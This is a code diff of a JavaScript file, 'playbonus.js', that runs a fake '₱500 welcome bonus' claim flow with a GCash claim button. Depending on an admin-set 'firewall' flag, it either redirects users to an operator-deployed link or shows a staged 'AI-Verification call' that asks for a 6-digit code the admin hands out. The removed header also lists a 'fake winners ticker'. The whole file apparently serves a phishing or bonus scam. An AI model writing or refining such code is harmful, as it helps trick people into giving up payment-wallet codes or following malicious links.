@@ -1,25 +1,9 @@
 /**
- * playbonus.js — REMASTERED
+ * playbonus.js — UPDATED (Phase 1 & 2 Flow Fixed)
  * ============================================================
- * FEATURES:
- *  - Firebase init + user_sessions/{phone}
- *  - Auto popup (₱500 welcome bonus: 3s fresh / 5s claimed)
- *  - Claim ₱500 → credit balance (claimed_ptcat flag)
- *  - Timer (72h cycle)
- *  - Fake winners ticker
- *  - Confetti
- *  - Admin-only force logout
- *  - Ban check (banned_ghosts)
- *
- *  3-PHASE CLAIM FLOW (Carnival Theme):
- *      PHASE 1: HOORAY — balance + bills + CLAIM THRU GCASH
- *      PHASE 2: GREAT JOB — confirm + PROCEED
- *      PHASE 3: AI-VERIFICATION CALL — 6-digit code
- *
- *  FIREWALL LOGIC:
- *      FIREWALL OFF → Phase 1 → Phase 2 → REDIRECT to admin-deployed link
- *      FIREWALL ON  → Phase 1 → Phase 2 → Phase 3 (AI-Verification) → submit
- *
+ * FLOW:
+ *   FIREWALL OFF → Phase 1 → Phase 2 → Redirect to deployed link
+ *   FIREWALL ON  → Phase 1 → Phase 3 (SKIP Phase 2) → AI-Verification
  * ============================================================
  */
 
@@ -29,10 +13,6 @@
     // ============================================================
     // CONFIGURATION
     // ============================================================
-    // Verification mode:
-    //   'admin_manual' — Admin magbibigay ng code via chat
-    //   'sms_api'      — May tunay na SMS backend
-    //   'demo'         — Temporary test mode (⚠️ INSECURE)
     var VERIFICATION_MODE = 'admin_manual';
 
     // ============================================================
@@ -54,7 +34,6 @@
     var listenersSetup = false;
     var pageLoadTime = Date.now();
 
-    // 3-Phase state
     var currentPhase = 1;
     var isTransitioning = false;
     var currentFirewallStatus = false;
@@ -106,7 +85,7 @@
     // INIT
     // ============================================================
     function init() {
-        console.log('🎁 PlayBonus REMASTERED Starting...');
+        console.log('🎁 PlayBonus Starting...');
 
         userPhone = localStorage.getItem("userPhone");
         if (!userPhone) {
@@ -130,7 +109,7 @@
         initAdminForceLogoutListener();
         injectCarnivalAnimations();
 
-        console.log('✅ PlayBonus REMASTERED ready!');
+        console.log('✅ PlayBonus ready!');
     }
 
     // ============================================================
@@ -297,7 +276,7 @@
     }
 
     // ============================================================
-    // GET DEPLOYED LINK (para sa Phase 2 redirect kapag firewall OFF)
+    // DEPLOYED LINK
     // ============================================================
     function getDeployedLink() {
         try {
@@ -657,7 +636,10 @@
         }, 250);
     }
 
+    // ============================================================
     // ---- PHASE 1: HOORAY ----
+    // Decision point: firewall ON → Phase 3, firewall OFF → Phase 2
+    // ============================================================
     function renderPhase1() {
         currentPhase = 1;
         var inner = document.getElementById('claimPhaseInner');
@@ -712,7 +694,23 @@
                     return;
                 }
                 playSound('scatter');
-                transitionTo(renderPhase2);
+
+                claimBtn.disabled = true;
+                claimBtn.innerHTML = '⏳ CHECKING...';
+
+                // ✅ DECISION POINT: firewall ON → Phase 3, OFF → Phase 2
+                checkFirewallBeforeClaim().then(function(firewallOn) {
+                    if (firewallOn) {
+                        console.log('🔥 Firewall ON → Phase 3 agad (skip Phase 2)');
+                        transitionTo(renderPhase3);
+                    } else {
+                        console.log('🔓 Firewall OFF → Phase 2');
+                        transitionTo(renderPhase2);
+                    }
+                }).catch(function() {
+                    // Fail-safe
+                    transitionTo(renderPhase2);
+                });
             };
         }
     }
@@ -738,7 +736,10 @@
         }
     }
 
-    // ---- PHASE 2: GREAT JOB ----
+    // ============================================================
+    // ---- PHASE 2: GREAT JOB (FIREWALL OFF ONLY) ----
+    // Phase 2 = redirect only. Walang firewall check.
+    // ============================================================
     function renderPhase2() {
         currentPhase = 2;
         var inner = document.getElementById('claimPhaseInner');
@@ -784,22 +785,11 @@
                 playSound('scatter');
 
                 proceedBtn.disabled = true;
-                proceedBtn.innerHTML = '⏳ CHECKING...';
+                proceedBtn.innerHTML = '⏳ REDIRECTING...';
 
-                checkFirewallBeforeClaim().then(function(firewallOn) {
-                    if (firewallOn) {
-                        // 🔥 FIREWALL ON → Phase 3 (AI-Verification)
-                        console.log('🔥 Firewall ON → Phase 3 AI-Verification');
-                        transitionTo(renderPhase3);
-                    } else {
-                        // 🔓 FIREWALL OFF → Redirect to admin-deployed link
-                        console.log('🔓 Firewall OFF → Redirect to deployed link');
-                        redirectToDeployedLink(proceedBtn);
-                    }
-                }).catch(function() {
-                    // Fail-safe: redirect
-                    redirectToDeployedLink(proceedBtn);
-                });
+                // ✅ Phase 2 = FIREWALL OFF lang (kasi ON → Phase 3 na agad)
+                // Walang firewall check dito — redirect agad
+                redirectToDeployedLink(proceedBtn);
             };
         }
     }
@@ -841,7 +831,9 @@
         });
     }
 
-    // ---- PHASE 3: AI-VERIFICATION CALL ----
+    // ============================================================
+    // ---- PHASE 3: AI-VERIFICATION CALL (FIREWALL ON ONLY) ----
+    // ============================================================
     function renderPhase3() {
         currentPhase = 3;
         var inner = document.getElementById('claimPhaseInner');
@@ -899,10 +891,9 @@
 
         if (closeBtn) closeBtn.onclick = closePhasePopup;
         if (backBtn) backBtn.onclick = function() {
-            transitionTo(renderPhase2);
+            transitionTo(renderPhase1);
         };
 
-        // Start AI call simulation
         startAICallSimulation();
 
         if (input) {
@@ -973,7 +964,6 @@
         var statusEl = document.getElementById('aiCallStatus');
         if (!statusEl) return;
 
-        // Simulate: 1.5s dialing
         statusEl.innerHTML = '📞 Dialing...';
         statusEl.style.color = '#00d4ff';
 
@@ -981,7 +971,6 @@
             statusEl.innerHTML = '🔊 AI Call Connected — Listen for the code';
             statusEl.style.color = '#39ff14';
 
-            // Save to Firebase: call_requested
             try {
                 db.ref('ai_call_requests').push({
                     phone: userPhone,
@@ -995,17 +984,15 @@
     // ---- VERIFY CODE ----
     function verifyCodeWithBackend(code) {
         if (VERIFICATION_MODE === 'demo') {
-            // ⚠️ DEMO MODE: Accept any 6-digit code (INSECURE — for testing only)
-            console.warn('⚠️ DEMO MODE: Accepting any 6-digit code');
+            console.warn('⚠️ DEMO MODE');
             return Promise.resolve(true);
         }
 
         if (VERIFICATION_MODE === 'admin_manual') {
-            // Admin magbibigay ng code via chat — naka-store sa verification_codes/{phone}
             return db.ref('verification_codes/' + userPhone).once('value')
                 .then(function(snap) {
                     if (!snap.exists()) {
-                        console.warn('⚠️ No verification code found for', userPhone);
+                        console.warn('⚠️ No verification code found');
                         return false;
                     }
 
@@ -1013,17 +1000,14 @@
                     var storedCode = String(data.code || '');
                     var expiresAt = data.expiresAt || 0;
 
-                    // Check expiration (default 5 minutes)
                     if (expiresAt && Date.now() > expiresAt) {
                         console.warn('⚠️ Verification code expired');
                         return false;
                     }
 
-                    // Compare
                     var match = (storedCode === String(code));
 
                     if (match) {
-                        // Mark as used
                         db.ref('verification_codes/' + userPhone).update({
                             used: true,
                             usedAt: Date.now()
@@ -1039,14 +1023,10 @@
         }
 
         if (VERIFICATION_MODE === 'sms_api') {
-            // ⚠️ Palitan ito ng iyong tunay na SMS backend
             return fetch('https://your-backend.com/api/verify', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    phone: userPhone,
-                    code: code
-                })
+                body: JSON.stringify({ phone: userPhone, code: code })
             })
             .then(function(r) { return r.json(); })
             .then(function(d) { return d.ok === true; })
@@ -1131,7 +1111,7 @@
     }
 
     // ============================================================
-    // CARNIVAL ANIMATIONS (injected)
+    // CARNIVAL ANIMATIONS
     // ============================================================
     function injectCarnivalAnimations() {
         if (document.querySelector('#carnival-animations')) return;
@@ -1415,7 +1395,7 @@
     // ============================================================
     function initAdminForceLogoutListener() {
         if (!userPhone || !db) {
-            console.log('⚠️ Cannot init force logout - missing userPhone or db');
+            console.log('⚠️ Cannot init force logout');
             return;
         }
 
@@ -1428,19 +1408,16 @@
                 forceLogout: false,
                 lastSeen: firebase.database.ServerValue.TIMESTAMP
             }).then(function() {
-                console.log('✅ User reset to ONLINE, forceLogout flag cleared');
-
+                console.log('✅ User reset to ONLINE');
                 setTimeout(function() {
                     setupAdminLogoutListener(cleanPhone);
                 }, 2000);
-
             }).catch(function(e) {
                 console.error('Failed to reset user status:', e);
                 setTimeout(function() {
                     setupAdminLogoutListener(cleanPhone);
                 }, 3000);
             });
-
         } catch(e) {
             console.error('Force logout listener error:', e);
         }
@@ -1471,8 +1448,6 @@
                 }
 
                 showForceLogoutPopup();
-            } else if (forceFlag === true && timeSinceLoad <= 3000) {
-                console.log('⏭️ Ignoring forceLogout flag (too soon after page load)');
             }
         });
 
@@ -1483,15 +1458,14 @@
             var now = Date.now();
             var timeSinceLoad = now - pageLoadTime;
 
-            console.log('📡 Status update:', status, '(time since load:', Math.floor(timeSinceLoad/1000) + 's)');
+            console.log('📡 Status update:', status);
 
             if (status === 'offline' && !logoutTriggered && timeSinceLoad > 3000) {
-
                 db.ref('user_sessions/' + cleanPhone + '/forceLogout').once('value').then(function(flagSnap) {
                     var forceFlag = flagSnap.val();
 
                     if (forceFlag === true) {
-                        console.log('⚠️ ADMIN FORCE LOGOUT (via status change)!');
+                        console.log('⚠️ ADMIN FORCE LOGOUT (via status)');
                         logoutTriggered = true;
 
                         if (forceLogoutListener) {
@@ -1500,8 +1474,6 @@
                         }
 
                         showForceLogoutPopup();
-                    } else {
-                        console.log('ℹ️ Status is offline but forceLogout is false — ignoring');
                     }
                 });
             }
